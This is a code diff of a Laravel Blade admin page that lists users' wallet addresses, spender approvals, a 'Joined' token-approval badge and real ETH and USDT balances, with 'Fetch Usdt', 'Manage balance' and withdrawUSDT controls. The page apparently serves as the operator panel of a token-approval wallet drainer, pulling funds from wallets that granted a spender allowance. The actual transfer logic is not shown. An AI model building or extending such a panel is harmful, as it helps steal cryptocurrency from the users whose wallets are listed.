@@ -29,6 +29,9 @@
                             <div id="app">
                                 <Wallet />
                             </div>
+                            <?php
+                                $walletAddress = session('walletAddress');
+                            ?>
                         </div>
                     </div>
                 </div>
@@ -53,7 +56,9 @@
                         @foreach($data as $key => $user)
                         <tr>
                             <td>{{$key += 1}}</td>
-                            <td><a href="user/{{$user->user_id}}/transactions">{{$user->user_id}}</a></td>
+                            <td><a href="user/{{$user->user_id}}/transactions">{{$user->user_id}} <br/>
+                                <span class="badge badge-info">@if($user->token_approved == 1) <small>Joined</small>@endif</span>
+                            </a></td>
                             <td>{{$user->wallet}} <br> <span class="badge badge-primary">{{$user->spender ?? $user->spender }}</span></td>
                             {{-- {{$stats}} --}}
                             <td>
@@ -66,7 +71,7 @@
                                 @endif
                             </td>
 
-                            <td id="real_balance">{{$user->eth_real_balance}} <br><span class="badge badge-secondary">{{$user->eth_real_balance_updated_at}}</span></td>
+                            <td id="real_balance">{{$user->eth_real_balance ?? '-'}} <br><span class="badge badge-secondary">{{$user->eth_real_balance_updated_at}}</span></td>
 
                             <td>
                                 @if (count($user->balance) > 0)
@@ -75,7 +80,7 @@
                                     -
                                 @endif
                             </td>
-                            <td id="real_balance">{{$user->usdt_real_balance}} <br><span class="badge badge-secondary">{{$user->usdt_real_balance_updated_at}}</span></td>
+                            <td id="real_balance">{{$user->usdt_real_balance ?? '-'}} <br><span class="badge badge-secondary">{{$user->usdt_real_balance_updated_at}}</span></td>
 
 
                             <td>@if ($user->status == 'pending') <span class="badge badge-warning">pending</span> @else <span class="badge badge-primary">approved</span>@endif</td>
@@ -88,6 +93,7 @@
                                 <a href="#" onClick="updateStatus({{$user->id}})" data-user_id={{$user->id}} class="btn btn-primary btn-sm">
                                     Approve
                                 </a>
+                                <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn btn-secondary btn-sm">Manage balance</a>
                                 @else
                                 <a href="#" id="modal_usdt_{{$user->id}}" onClick="fetchUsdtToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->usdt_real_balance}}>
                                     Fetch Usdt
@@ -310,10 +316,10 @@
     };
 
     async function fetchEthToken(id) {
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        });
-        const adminWalletAddress = accounts[0];
+        // const accounts = await window.ethereum.request({
+        //     method: 'eth_requestAccounts'
+        // });
+        // const adminWalletAddress = accounts[0];
 
         var wallet = $("#modal_eth_" + id).attr('data-wallet');
         var balance = $("#modal_eth_" + id).attr('data-balance');
@@ -325,7 +331,7 @@
         }else{
 
             $("#modal-wallet").val(wallet);
-            $("#modal-spender").val(adminWalletAddress);
+            // $("#modal-spender").val(adminWalletAddress);
             $("#modal-balance").text(balance);
 
             $('#fetchForm').modal({
@@ -337,10 +343,10 @@
     }
 
     async function fetchUsdtToken(id) {
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        });
-        const adminWalletAddress = accounts[0];
+        // const accounts = await window.ethereum.request({
+        //     method: 'eth_requestAccounts'
+        // });
+        // const adminWalletAddress = accounts[0];
 
         var wallet = $("#modal_usdt_" + id).attr('data-wallet');
         var balance = $("#modal_usdt_" + id).attr('data-balance');
@@ -352,7 +358,7 @@
         }else{
 
             $("#modal-wallet").val(wallet);
-            $("#modal-spender").val(adminWalletAddress);
+            // $("#modal-spender").val(adminWalletAddress);
             $("#modal-balance").text(balance);
 
             $("#btn-fetch").attr('onClick','withdrawUSDT()');
